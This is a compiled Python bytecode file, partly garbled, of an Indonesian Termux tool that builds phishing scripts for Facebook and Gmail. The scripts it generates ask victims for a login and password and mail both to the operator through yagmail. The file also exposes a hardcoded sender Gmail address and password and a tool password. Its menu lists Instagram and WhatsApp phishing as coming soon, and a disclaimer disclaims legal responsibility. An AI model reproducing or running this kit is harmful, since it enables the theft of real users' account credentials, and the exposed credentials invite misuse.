U
    qสฆ^๊  ใ                   @   sผ   d dl Z d dlZd dlZd dlmZ ejddd dZdd Zd	d
 Zdd Z	dd Z
dd Zdd Zdd Zdd Zdd Zdd Zdd Zdd Zdd Ze	  e  ed krธe  dS )!้    N)ฺcoloredฺclearTฉฺshellzKuhaku: ~# c                   C   s   t d t dก d S )NZAcceptg333333๛?)ฺprintฺtimeฺsleepฉ r	   r	   ๚pishing.yag.pyฺusr   s    r   c                   C   s   t d d S )NZAceept)r   r	   r	   r	   r
   ฺpss
   s    r   c                  C   sJ   t   td td td} | dkr.t  ntd t dก t  d S )Nz[1;94m
masukan password tools ini, untuk masuk kedalam tools pembuat
pishing ini password ada di fanspage author tools
fanspage : Kuhaku Termux ฺ z[1;92mPassWord :  [1;97mZ
TheXKuhakuzPassWord salah้   )r   r   ฺinputr   r   r   ฺlogin)r   r	   r	   r
   r      s    
r   c                   C   s    t jddd t jddd d S )N๚figlet PishingTr   ๚figlet facebookฉฺ
subprocessฺcallr	   r	   r	   r
   ฺlogo_facebook   s    r   c                  C   sr  t dd} t  tjddd tjddd td td tt}t  t  td	 td tt}t  t  td
 td tt}d}d}d}d}d}d}	d}
d}t  t  td td td}t  t  td td td tt}|}|}|}|}|}d}|  |ก |  |ก |  |	ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |
ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  	ก  td t
 dก ttdd td t
 dก td t
 dก d S )Nzpishing_facebook.pyฺwr   Tr   r   z
    masukan kata kata untuk membuat ada yg percaya

    contoh :

    print('Untuk menjadi bot mohon login akun anda dulu')
    ๚	zT
    gunakan/ketik :

    subject='bebas'

    contoh :

    subject='berhasil !!!' z[1;92m
    Terapkan banner di terserah kalian banner ini menggunakan
    figlet...

    subprocess.call('figlet bebas',shell=True)[1;96m๚from termcolor import colored๚import subprocessz#subprocess.call('clear',shell=True)z*username=str(input('masukan no/gmail : '))๚*password=str(input('Masukan password : '))๚import yagmail๚3body=('username: '+username, 'password: '+password)๚5kuhaku=yagmail.SMTP('bacotok3@gmail.com','percobaan')zK
    gunakan/ketik :

    kuhaku.send('gmail anda@gmail.com',subject,body) ๚gmail anda : z
    akhiri kata kata dengan sangat elegan :)

    contoh :

    print('mohon maaf server sedang penuh, harap coba 6 hari krmabli')ฺ
r   ็333333ำ?๚Sedang memprosess...ฺyellow้   z?[1;93mSelesai, hasil nya adalah ( pishing_facebook.py )[1;97mr   )ฺopenr   r   r   r   r   ฺkuhakuBasrcr   ฺwriteฺcloser   r   ฺmainr   )ฺkuhakuฺtext1ฺsubjectฺbanerฺ	termcolorฺsubZcleaฺuserฺpwฺmoduleฺallฺawalฺpenerimaฺtext2Zbannerฺkata1ฺkata2ฺmenerimaฺexampleฺblock1r	   r	   r
   ฺfacebook   s    





























r<   c                  C   sV   t d t d t d ttt} | dkr4t  n| dkrDt  n| dkrRt  d S )NZpishingฺinfoฺmenu)r   ฺstrr   r&   ฺListr=   ฺmeta)ฺmeenur	   r	   r
   rB      s    rB   c                 C   s2   | d D ]$}t j |ก t j ก  t dก qd S )Nr    gฎ?)ฺsysฺstdoutr'   ฺflushr   r   )r*   ZTheXr	   r	   r
   r)      s    
r)   c                   C   s   t jddd d S )Nr   Tr   r   r	   r	   r	   r
   r      s    c                  C   s&   t d ttt} | dkr"t  d S )NzKetik help untuk membuka menuฺhelp)r   r?   r   r&   rB   )r>   r	   r	   r
   ฺnew_menu   s    rG   c                  C   sZ   t d t d t d t d t d t d td} | dkrHt  n| d	krVt  d S )
Nz[1;91m1. [1;97mpishing gmailz![1;91m2. [1;97mpishing facebookz7[1;91m3. [1;97mpishing instagram (coming soon)[1;97mz5[1;91m4. [1;97mpishing whatapp (coming soon)[1;97mz[1;91m5. [1;97mExit [1;97mr   z
Kuhaku ~# ฺ1ฺ2)r   r   ฺgmailr<   )r@   r	   r	   r
   r@   ข   s     r@   c                   C   sJ   t   td td td td td td td td d S )	Nu์  
     โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
     โ                  PERINGATAN                    โ
     โ    Saya Tidak Bertanggung Jawab Atas Segala    โ
     โ       Pelanggaran HUKUM Yang Anda lakukan      โ
     โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโr    z%[1;96mAuthor:   [1;97mKuhaku Termuxz%[1;96mYoutube:  [1;97mKuhaku Termuxz6Tools ini untuk membuat sebuah program pishing python3zdengan library yagmailu๊   โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโr   )r   r   r	   r	   r	   r
   rA   ฎ   s    rA   c                   C   s    t jddd t jddd d S )Nr   Tr   ๚figlet Gmailr   r	   r	   r	   r
   ฺ
logo_gmailฝ   s    rL   c                  C   sN  t dd} t  tjddd tjddd td td tt}t  t  td	 td tt}d
}d}d}d}d}d}d}	d}
d}t  t  td td td}t  t  td td td tt}|}|}|}|}d}|  |	ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |
ก |  |ก |  |ก |  |ก |  |ก |  |ก |  |ก |  	ก  td t
 dก ttdd td t
 dก td t
 dก d S )Nzpishing_gmail.pyr   r   Tr   rK   z
    masukan kata kata untuk membuat ada yg percaya
    
    contoh :
    
    print('Untuk menjadi bot mohon login akun anda dulu')
    r   zT
    gunakan/ketik :

    subject='bebas' 

    contoh : 

    subject='berhasil !!!r   z*subprocess.call("figlet Gmail",shell=True)r   z#subprocess.call("clear",shell=True)z'username=str(input('masukan gmail : '))r   r   r   r   zO
    gunakan/ketik :
    
    kuhaku.send('gmail anda@gmail.com',subject,body) r   z
    akhiri kata kata dengan sangat elegan :)
    
    contoh :
    
    print('mohon maaf server sedang penuh, harap coba 6 hari krmabli')r    r   r!   r"   r#   r$   z<[1;93mSelesai, hasil nya adalah ( pishing_gmail.py )[1;97mr   )r%   r   r   r   r   r   r&   rL   r'   r(   r   r   r)   r   )r*   r+   r,   r.   r-   r/   Zhhr0   r1   r2   r3   r4   r5   r6   r7   r8   r9   r:   r;   r	   r	   r
   rJ   ภ   s    





























rJ   ฺ__main__)rC   r   r   r.   r   r   r&   r   r   r   r   r<   rB   r)   r   rG   r@   rA   rL   rJ   ฺ__name__r	   r	   r	   r
   ฺ<module>   s,   ja